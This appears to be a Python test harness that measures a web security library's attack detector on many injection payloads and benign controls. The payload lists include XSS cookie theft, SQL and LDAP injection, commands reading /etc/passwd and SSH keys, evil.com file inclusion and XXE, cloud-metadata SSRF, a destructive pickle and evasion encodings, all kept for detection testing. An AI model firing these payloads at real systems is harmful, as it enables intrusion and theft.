"""Enumerate every case verified this release, with a MEASURED base verdict.

Usage:  python defect_corpus.py <measure_tree> <corpus_source_tree>

Every payload is delivered as WIRE BYTES through detect_penetration_attempt,
across each body mechanism, because Python-string delivery cannot see the
parser differential. Emits JSON on stdout for the harness to consume.
"""

import asyncio
import base64
import html
import importlib
import json
import os
import random
import struct
import subprocess
import sys
import urllib.parse
from pathlib import Path
from typing import Any

TREE = sys.argv[1].rstrip("/")
FROZEN_CORPUS_TREE = sys.argv[2]
sys.path.insert(0, TREE)

guard_core = importlib.import_module("guard_core")
_module_file = guard_core.__file__
assert _module_file is not None and TREE in _module_file, f"WRONG TREE: {_module_file}"

models = importlib.import_module("guard_core.models")
utils = importlib.import_module("guard_core.utils")
SecurityConfig = models.SecurityConfig
detect_penetration_attempt = utils.detect_penetration_attempt

PICKLE_TAIL = b"cshutil\nrmtree\n(S'/tmp/x'\ntR."
XSS = "<script>alert(document.cookie)</script>"
SQLI = "' OR 1=1--"
CMD = "; cat /etc/passwd"
TRAV = "../../../../etc/passwd"
TMPL = "{{7*7}}"


def b64_joined(payload: str, sep: bytes) -> bytes:
    enc = base64.b64encode(payload.encode()).decode()
    return sep.join(enc[i : i + 6].encode() for i in range(0, len(enc), 6))


def obj_params(n: int) -> bytes:
    inner = "".join('<param name="allowScriptAccess" value="always">' for _ in range(n))
    return f'<object data="evil.swf">{inner}</object>'.encode()


def filename_ws(n: int) -> bytes:
    return ("filename" + " " * n + "=" + " " * n + '"shell.php.jpg"').encode()


EVASION_PAYLOADS = {
    "xss": XSS,
    "xss_attr": '<img src=x onerror="alert(1)">',
    "sqli": SQLI,
    "sqli_union": "SELECT id FROM users WHERE id=1 UNION SELECT password FROM admin",
    "cmd": CMD,
    "traversal": TRAV,
    "ldap": "*)(uid=*",
    "template": TMPL,
}


def _b64_frag(text: str, sep: str, urlsafe: bool = False) -> str:
    enc = base64.urlsafe_b64encode if urlsafe else base64.b64encode
    s = enc(text.encode()).decode()
    return sep.join(s[i : i + 6] for i in range(0, len(s), 6))


EVASION_AXES = {
    "plain": lambda p: p,
    "sp_sep": lambda p: p.replace("", " ", 1),
    "tab": lambda p: "\t" + p,
    "crlf": lambda p: "\r\n" + p,
    "upper": lambda p: p.upper(),
    "mixed": lambda p: "".join(c.upper() if i % 2 else c for i, c in enumerate(p)),
    "url": lambda p: urllib.parse.quote(p),
    "url2x": lambda p: urllib.parse.quote(urllib.parse.quote(p)),
    "entity": lambda p: html.escape(p),
    "uni_esc": lambda p: "".join(f"\\u{ord(c):04x}" for c in p),
    "pre_junk": lambda p: "x" * 40 + p,
    "post_junk": lambda p: p + "x" * 40,
    "b64_nl": lambda p: _b64_frag(p, "\n"),
    "b64_sp": lambda p: _b64_frag(p, " "),
    "b64_url": lambda p: _b64_frag(p, "\n", urlsafe=True),
}

EVASION_ATTACKS: list[tuple[str, bytes]] = [
    (f"ev_{fam}_{axis}", fn(payload).encode())
    for fam, payload in EVASION_PAYLOADS.items()
    for axis, fn in EVASION_AXES.items()
]

EMBEDDED_TERMINATOR_ATTACKS: list[tuple[str, bytes]] = [
    ("emb_xss_script_lt_attr", b'<script x="<" src="//evil/x.js">alert(1)</script>'),
    ("emb_xss_object_lt_attr", b'<object x="<" data="//evil.com/x.swf"></object>'),
    ("emb_xss_embed_lt_attr", b'<embed x="<" src="//evil.com/x.swf"></embed>'),
    ("emb_xss_applet_lt_attr", b'<applet x="<" code="//evil.com/x.class"></applet>'),
    (
        "emb_xss_style_expression_nested_paren",
        b'<div style="x:expression(String.fromCharCode(97))">',
    ),
    (
        "emb_sqli_load_file_nested_paren",
        b"LOAD_FILE(CONCAT(0x2f6574632f706173737764))",
    ),
    (
        "emb_dir_traversal_matrix_param_dot",
        b"/app/..;jsessionid=ABCDEF0123456789.node1/WEB-INF/web.xml",
    ),
    ("emb_cmd_injection_dollar_paren_var", b";$(cat $HOME/.ssh/id_rsa)"),
    ("emb_file_inclusion_multisegment_path", b"=http://evil.com/a/b/shell.php"),
    (
        "emb_xml_entity_system_literal_lt",
        b'<!ENTITY xxe SYSTEM "http://evil.com/<x">',
    ),
    (
        "emb_xml_doctype_externalid_lt",
        b'<!DOCTYPE foo SYSTEM "http://evil.com/<x" '
        b'[<!ENTITY xxe SYSTEM "http://evil.com/y">]>',
    ),
    (
        "emb_template_ssti_hash_brace_string_hash",
        b'#{"a#b".gsub(/x/,"y")}',
    ),
]


def _asim_gif_bytes(n: int = 4000) -> bytes:
    rng = random.Random(3)
    return b"GIF89a" + bytes(rng.getrandbits(8) for _ in range(n)) + b"\x00\x3b"


def _nested_json_attack(depth: int, leaf: str) -> bytes:
    leaf_json = json.dumps(leaf)
    prefix = '{"a":' * depth
    suffix = "}" * depth
    return (prefix + leaf_json + suffix).encode()


def _oversized_body_with_marker_in_first_kb(total_size: int, marker: str) -> bytes:
    marker_bytes = marker.encode()
    prefix = b"x" * 500
    filler = b"y" * (total_size - len(prefix) - len(marker_bytes))
    return prefix + marker_bytes + filler


_BENIGN_BODY_WORDS = [
    "the",
    "quick",
    "brown",
    "fox",
    "jumps",
    "over",
    "lazy",
    "dog",
    "customer",
    "order",
    "invoice",
    "shipment",
    "product",
    "warehouse",
    "region",
    "quarter",
    "revenue",
    "report",
    "summary",
    "analytics",
]


def _oversized_benign_body(total_size: int) -> bytes:
    rng = random.Random(13)
    parts = []
    length = 0
    while length < total_size:
        word = rng.choice(_BENIGN_BODY_WORDS)
        parts.append(word)
        length += len(word) + 1
    return " ".join(parts)[:total_size].encode()


ATTACKS: list[tuple[str, bytes]] = [
    ("b64_invalid_byte_xss", b64_joined(XSS, b"\x85")),
    ("b64_invalid_byte_sqli", b64_joined(SQLI, b"\x85")),
    ("b64_invalid_byte_cmd", b64_joined(CMD, b"\x85")),
    ("b64_invalid_byte_traversal", b64_joined(TRAV, b"\x85")),
    ("b64_invalid_byte_template", b64_joined(TMPL, b"\x85")),
    ("b64_ascii_vt_xss", b64_joined(XSS, b"\x0b")),
    ("b64_ascii_us_sqli", b64_joined(SQLI, b"\x1f")),
    ("pickle_newtrue_prefix", b"\x88" + PICKLE_TAIL),
    ("pickle_proto_prefix", b"\x80\x04" + PICKLE_TAIL),
    (
        "pickle_frame_prefix",
        b"\x95" + struct.pack("<Q", len(PICKLE_TAIL)) + PICKLE_TAIL,
    ),
    ("sqli_numeric_tautology_comment", b"1 OR 1=1--"),
    ("sqli_numeric_tautology_bare", b"1 OR 1=1"),
    ("sqli_numeric_tautology_lower", b"1 or 1=1"),
    ("sqli_numeric_tautology_five", b"5 OR 5=5"),
    ("sqli_numeric_tautology_and", b"1 AND 1=1"),
    ("sqli_numeric_tautology_param", b"id=1 OR 1=1--"),
    ("sqli_placeholder_pct_s", b"WHERE id = %s;OR1=1--"),
    ("sqli_placeholder_qmark", b"WHERE id = ?;OR1=1--"),
    ("sqli_placeholder_dollar", b"WHERE id = $1;OR1=1--"),
    ("upload_filename_ws_21", filename_ws(21)),
    ("upload_filename_ws_40", filename_ws(40)),
    ("xss_object_9_params", obj_params(9)),
    ("xss_object_15_params", obj_params(15)),
    ("ldap_comparator_tilde", b"admin)(cn~=x"),
    ("ldap_comparator_gte", b"admin)(sn>=A"),
    ("ldap_comparator_pw_gte", b"admin)(userPassword>=A"),
    ("ldap_rfc4515_escaped", rb"admin\29\28cn=\2a"),
    ("ldap_rfc4515_wildcard", rb"*\29\28cn=admin"),
    ("ldap_no_attr_caseexact", b"*)(:caseExactMatch:=admin"),
    ("ldap_no_attr_oid_rule", b"*)(:1.2.840.113556.1.4.804:=admin"),
    ("ldap_no_attr_dn_oid_rule", b"*)(:dn:1.2.840.113556.1.4.804:=admin"),
    ("ldap_numericoid_attr_equality", b"*)(1.3.6.1.4.1.1466.0=admin"),
    ("ldap_numericoid_attr_wildcard", b"*)(1.3.6.1.4.1.1466.0=*)"),
    ("ldap_numericoid_attr_extensible", b"*)(1.2.840.113556.1.4.804:=admin"),
    ("ldap_attr_options_extensible", b"*)(cn;lang-en:=admin"),
    ("ldap_attr_multi_options_extensible", b"*)(cn;lang-en;binary:=admin"),
    ("ldap_comparator_numericoid_approx", b"admin)(1.2.840~=admin"),
    ("ldap_comparator_no_attr_approx", b"admin)(:caseExactMatch~=admin"),
    ("ldap_comparator_attr_options_approx", b"admin)(cn;lang-en~=admin"),
    ("ssti_short_dollar_b64", base64.b64encode(b"${7*7}")),
    ("ssti_short_hash_b64", base64.b64encode(b"#{7*7}")),
    (
        "eval_alias_function_chain",
        b"Function('return this')()['eval']('alert(document.cookie)')",
    ),
    ("eval_alias_function_call", b"Function('alert(document.cookie)')()"),
    (
        "eval_alias_new_function",
        b"new Function('return process.mainModule.require(\"child_process\")')()",
    ),
    ("eval_alias_window_bracket", b"window['eval']('alert(document.cookie)')"),
    ("eval_alias_constructor_chain", b"[]['constructor']['constructor']('alert(1)')()"),
    ("eval_alias_settimeout_string", b"setTimeout('alert(document.cookie)',0)"),
    ("cmdexec_node_execsync", b"require('child_process').execSync('echo pwned')"),
    ("cmdexec_node_spawn", b"require('child_process').spawn('echo',['pwned'])"),
    ("cmdexec_node_spawnsync", b"require('child_process').spawnSync('echo',['pwned'])"),
    ("cmdexec_node_fork", b"require('child_process').fork('/tmp/evil.js')"),
    ("cmdexec_php_assert", b"assert($_GET['cmd'])"),
    ("cmdexec_php_create_function", b"create_function('', $_GET['cmd'])"),
    ("cmdexec_python_execl", b"os.execl('/bin/sh','sh','-c','id')"),
    ("cmdexec_python_execve", b"os.execve('/bin/sh',['sh','-c','id'],{})"),
    ("xss_js_scheme_tab", b'<a href="java\tscript:alert(document.cookie)">x</a>'),
    ("xss_js_scheme_newline", b'<a href="java\nscript:alert(document.cookie)">x</a>'),
    ("xss_js_scheme_cr", b'<a href="java\rscript:alert(document.cookie)">x</a>'),
    ("nosql_ne_bare_bool", b'{"isAdmin":{"$ne":false}}'),
    (
        "nosql_json_structure_ne_null",
        b'{"username":{"$ne":null},"password":{"$ne":null}}',
    ),
    ("nosql_json_structure_where", b'{"$where":"1==1"}'),
    ("protopoll_json_structure_proto_key", b'{"__proto__":{"isAdmin":true}}'),
    ("protopoll_object_prototype_assign", b"Object.prototype.isAdmin = true"),
    ("protopoll_setprototypeof", b"Object.setPrototypeOf(user, {isAdmin:true})"),
    (
        "protopoll_reflect_setprototypeof",
        b"Reflect.setPrototypeOf(user, {isAdmin:true})",
    ),
    ("fileincl_json_rfi_php", b'{"template":"http://evil.example.com/shell.php"}'),
    ("fileincl_json_rfi_txt", b'{"include":"http://evil.example.com/payload.txt"}'),
    ("ssrf_bare_metadata_host", b"http://metadata/computeMetadata/v1/instance/"),
    ("ssrf_instance_data_host", b"http://instance-data/latest/meta-data/"),
    ("ssrf_ipv4_mapped_ipv6_loopback_bracket", b"http://[::ffff:127.0.0.1]/"),
    ("ssrf_localhost_trailing_dot", b"http://localhost./"),
    (
        "sqli_union_comment_spaced",
        b"UNION /**/ SELECT /**/ username,password /**/ FROM /**/ users",
    ),
    (
        "codeinj_vars_dict_indirection",
        b"vars(__import__('os'))['system']('echo pwned')",
    ),
    (
        "xml_xxe_public_no_system",
        b'<!DOCTYPE foo PUBLIC "-//X//Y" "http://evil.example.com/evil.dtd">',
    ),
    (
        "scan_value_cap_regression_ordinary_sqli_still_detected",
        b"1 OR 1=1 UNION SELECT password_hash FROM admin_users--",
    ),
    ("json_nested_depth10_sqli", _nested_json_attack(10, "' OR 1=1--")),
    ("json_nested_depth40_sqli", _nested_json_attack(40, "' OR 1=1--")),
    (
        "embedded_json_recursion_depth1500_xss",
        _nested_json_attack(1500, "<script>alert(1)</script>"),
    ),
    (
        "oversized_body_attack_in_first_kb",
        _oversized_body_with_marker_in_first_kb(300_000, SQLI),
    ),
]

BENIGN: list[tuple[str, bytes]] = [
    ("oversized_body_benign_reporter_style", _oversized_benign_body(300_000)),
    ("sql_select_int_compare", b"SELECT id FROM users WHERE id = 5"),
    ("sql_select_bool_compare", b"SELECT name, email FROM customers WHERE active = 1"),
    ("sql_select_quoted_compare", b"SELECT * FROM orders WHERE status = 'shipped'"),
    ("sql_update_now", b"UPDATE users SET last_login = NOW() WHERE id = 42"),
    ("sql_boolean_two_columns", b"SELECT * FROM u WHERE status = 1 OR verified = 2"),
    ("sql_boolean_bare_columns", b"SELECT * FROM u WHERE active OR admin"),
    ("sql_json_wrapped", b'{"query":"SELECT count(*) FROM events WHERE day = 3"}'),
    ("ldap_existence_department", b"(objectClass=*)(department=Sales)"),
    ("ldap_existence_status", b"search_filter: (uid=*)(status=active)"),
    ("ldap_bare_wildcard_cn", b"(cn=*)(cn=admin)"),
    ("ldap_inert_added_clause", b"admin)(cn=x)"),
    ("ldap_bare_extensible_match", b"cn:=admin"),
    ("ldap_inert_no_attr_bare_equality", b"admin)(:caseExactMatch:=admin"),
    ("ldap_inert_numericoid_bare_equality", b"admin)(1.3.6.1.4.1.1466.0=admin"),
    ("ldap_inert_attr_options_bare_equality", b"admin)(cn;lang-en:=admin"),
    (
        "ldap_prose_then_wildcard",
        b"log_cleanup: (Cleanup completed after scanning all directories for old "
        b"files older than thirty days per policy)(pattern=*.log)",
    ),
    ("pickle_shaped_build_log", b"Build log: step finished(cache\nvalue\nR.\n"),
    ("mybatis_placeholder", b"SELECT * FROM t WHERE id = #{id}"),
    ("utf8_accented_text", "café latte commandé".encode()),
    ("upload_filename_clean", b'filename="report.pdf"'),
    ("minified_js_call", b"function f(a){return a(1)}f(function(x){return x})"),
    ("curried_call", b"handler(req)(res)"),
    ("shell_substitution_prose", b"items: 5 (approx)(note=see)"),
    ("cmdexec_benign_spawn_error", b'{"error":"spawn /bin/sh ENOENT"}'),
    ("cmdexec_benign_fork_repo", b'{"action":"fork","repo":"octocat/hello-world"}'),
    ("cmdexec_benign_call_user_func", b"call_user_func('array_map_validator', $input)"),
    ("cmdexec_benign_assert_test", b"assert(response.status == 200)"),
    (
        "xss_benign_java_script_prose",
        b"We wrote this module in Java, scripted the build with Make",
    ),
    ("nosql_benign_currency_dollar", b'{"price":"$100","currency":"USD"}'),
    ("nosql_benign_range_filter", b'{"price":{"min":10,"max":200}}'),
    ("protopoll_benign_tostring", b"Object.prototype.toString.call(value)"),
    (
        "protopoll_benign_hasownproperty",
        b"Object.prototype.hasOwnProperty.call(obj, key)",
    ),
    ("fileincl_benign_json_link", b'{"homepage":"http://example.com/about.php"}'),
    (
        "ssrf_benign_metadata_word",
        b'{"note":"please update the metadata for this record"}',
    ),
    ("ssrf_benign_ipv4_mapped_ipv6_public_bracket", b"http://[::ffff:8.8.8.8]/"),
    ("sqli_benign_comment", b"SELECT * /* all active */ FROM users WHERE active = 1"),
    ("codeinj_benign_vars_config", b"vars(config)['DEBUG']"),
    (
        "xml_benign_xhtml_doctype",
        b'<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
    ),
    ("asim_benign_random_gif_upload", _asim_gif_bytes()),
]

DOCUMENTED_LIMITATIONS: list[tuple[str, bytes]] = [
    ("nosql_gt_bare_number", b'{"price":{"$gt":100}}'),
    ("nosql_lte_bare_number", b'{"age":{"$lte":18}}'),
]

REDUCED_MECHANISMS = ("raw_body", "query_param")
REDUCE_BENCH_ASIM_MECHANISMS = False

_EXTRACT_FROZEN_BENCHMARK_CORPORA = """
import importlib.util, json, sys
frozen_tree, bench_path = sys.argv[1], sys.argv[2]
sys.path.insert(0, frozen_tree)
spec = importlib.util.spec_from_file_location("_frozen_bench", bench_path)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
print(json.dumps({
    "malicious": [
        {"case_id": c.case_id, "payload": c.payload} for c in mod.MALICIOUS_CORPUS
    ],
    "benign": [
        {"case_id": c.case_id, "payload": c.payload} for c in mod.BENIGN_CORPUS
    ],
}))
"""


def _frozen_dir_files(*parts: str) -> list[tuple[str, bytes]]:
    d = os.path.join(FROZEN_CORPUS_TREE, *parts)
    if not os.path.isdir(d):
        return []
    return [(p.stem, p.read_bytes()) for p in sorted(Path(d).iterdir()) if p.is_file()]


def _frozen_benchmark_corpora() -> tuple[list[tuple[str, str]], list[tuple[str, str]]]:
    bench_path = os.path.join(
        FROZEN_CORPUS_TREE, "tests", "test_sus_patterns", "test_detection_benchmark.py"
    )
    proc = subprocess.run(
        [
            sys.executable,
            "-c",
            _EXTRACT_FROZEN_BENCHMARK_CORPORA,
            FROZEN_CORPUS_TREE,
            bench_path,
        ],
        capture_output=True,
        text=True,
        check=True,
    )
    data = json.loads(proc.stdout)
    return (
        [(str(c["case_id"]), str(c["payload"])) for c in data["malicious"]],
        [(str(c["case_id"]), str(c["payload"])) for c in data["benign"]],
    )


def _dedupe_extend(
    named_rows: list[tuple[str, bytes]], seen: set[bytes], reduced: set[str]
) -> list[tuple[str, bytes]]:
    kept = []
    for name, body in named_rows:
        if body in seen:
            print(f"SKIP duplicate: {name}", file=sys.stderr)
            continue
        seen.add(body)
        if REDUCE_BENCH_ASIM_MECHANISMS:
            reduced.add(name)
        kept.append((name, body))
    return kept


REDUCED_MECHANISM_ROWS: set[str] = set()
_seen_bytes = {
    b
    for _, b in ATTACKS
    + EVASION_ATTACKS
    + EMBEDDED_TERMINATOR_ATTACKS
    + BENIGN
    + DOCUMENTED_LIMITATIONS
}

_asim_benign = [
    (f"asim_benign_{stem}", body)
    for stem, body in _frozen_dir_files(
        "tests", "attack_simulation", "corpus", "benign"
    )
]
_asim_malicious = [
    (f"asim_attack_{stem}", body)
    for stem, body in _frozen_dir_files(
        "tests", "attack_simulation", "corpus", "malicious"
    )
]
_bench_malicious_raw, _bench_benign_raw = _frozen_benchmark_corpora()
_RULED_CMD_LIMITATION_IDS = {
    "cmd_glued_backtick_past_rejected_leftmost_match",
    "cmd_defect5_sql_keyword_after_glued_shell_command",
    "cmd_defect5_prefix_command_word_glued_shell_command",
    "cmd_defect5_sql_keyword_within_exemption_window",
    "cmd_dollar_paren_bare_whoami",
    "cmd_dollar_paren_glued_wrapped_whoami",
    "cmd_denylist_glued_nmap",
    "cmd_denylist_glued_powershell",
}
_bench_attacks = [
    (f"bench_attack_{case_id}", payload.encode("utf-8", errors="surrogateescape"))
    for case_id, payload in _bench_malicious_raw
    if case_id not in _RULED_CMD_LIMITATION_IDS
]
DOCUMENTED_LIMITATIONS = DOCUMENTED_LIMITATIONS + [
    (f"bench_attack_{case_id}", payload.encode("utf-8", errors="surrogateescape"))
    for case_id, payload in _bench_malicious_raw
    if case_id in _RULED_CMD_LIMITATION_IDS
]
_bench_benign = [
    (f"bench_benign_{case_id}", payload.encode("utf-8", errors="surrogateescape"))
    for case_id, payload in _bench_benign_raw
]

BENIGN = (
    BENIGN
    + _dedupe_extend(_asim_benign, _seen_bytes, REDUCED_MECHANISM_ROWS)
    + _dedupe_extend(_bench_benign, _seen_bytes, REDUCED_MECHANISM_ROWS)
)
ATTACKS = (
    ATTACKS
    + _dedupe_extend(_bench_attacks, _seen_bytes, REDUCED_MECHANISM_ROWS)
    + _dedupe_extend(_asim_malicious, _seen_bytes, REDUCED_MECHANISM_ROWS)
)

MECHANISMS = ("raw_body", "form_body", "multipart_body", "json_body", "query_param")


class _State:
    pass


CONTENT_TYPE_OVERRIDES: dict[str, str] = {
    "json_nested_depth10_sqli": "application/json",
    "json_nested_depth40_sqli": "application/json",
}


class _Req:
    def __init__(
        self, body: bytes, mechanism: str, content_type: str | None = None
    ) -> None:
        self.client_host = "203.0.113.7"
        self.url_path = "/x"
        self.method = "POST"
        self.state: Any = _State()
        self.query_params: dict[str, str] = {}
        self.headers: dict[str, str] = {"content-type": content_type or "text/plain"}
        self._body = body
        if mechanism == "form_body":
            self.headers = {"content-type": "application/x-www-form-urlencoded"}
            self._body = b"payload=" + urllib.parse.quote(body, safe="").encode()
        elif mechanism == "multipart_body":
            self.headers = {"content-type": "multipart/form-data; boundary=B"}
            self._body = (
                b'--B\r\nContent-Disposition: form-data; name="f"\r\n\r\n'
                + body
                + b"\r\n--B--\r\n"
            )
        elif mechanism == "json_body":
            self.headers = {"content-type": "application/json"}
            self._body = (
                b'{"v":'
                + json.dumps(body.decode("utf-8", errors="surrogateescape")).encode(
                    "utf-8", errors="surrogateescape"
                )
                + b"}"
            )
        elif mechanism == "query_param":
            self.query_params = {"v": body.decode("utf-8", errors="surrogateescape")}
            self._body = b""

        self.headers["content-length"] = str(len(self._body))

    url_scheme: str = "https"
    url_full: str = "https://t/"
    scope: dict[str, Any] = {}

    def url_replace_scheme(self, _scheme: str) -> str:
        return "https://t/"

    async def body(self) -> bytes:
        return self._body


async def verdict(
    body: bytes, mechanism: str, content_type: str | None = None
) -> bool | str:
    try:
        result = await detect_penetration_attempt(
            _Req(body, mechanism, content_type), SecurityConfig()
        )
        return bool(result.is_threat)
    except Exception as exc:
        return f"ERROR:{type(exc).__name__}"


async def main() -> None:
    from guard_core.handlers.suspatterns_handler import sus_patterns_handler

    sus_patterns_handler.configure(SecurityConfig())
    if sus_patterns_handler._preprocessor is None:
        raise SystemExit(
            "ABORT: enhanced detection state not built; measuring legacy mode"
        )
    rows = []
    for kind, cases in (
        ("attack", ATTACKS + EVASION_ATTACKS + EMBEDDED_TERMINATOR_ATTACKS),
        ("benign", BENIGN),
        ("limitation", DOCUMENTED_LIMITATIONS),
    ):
        for name, body in cases:
            mechs = REDUCED_MECHANISMS if name in REDUCED_MECHANISM_ROWS else MECHANISMS
            content_type = CONTENT_TYPE_OVERRIDES.get(name)
            per = {}
            for mech in mechs:
                per[mech] = await verdict(body, mech, content_type)
            rows.append(
                {
                    "name": name,
                    "kind": kind,
                    "expected": kind == "attack",
                    "verdicts": per,
                    "mechanisms": list(mechs),
                }
            )
    print(json.dumps({"tree": TREE, "rows": rows}, indent=1))


asyncio.run(main())
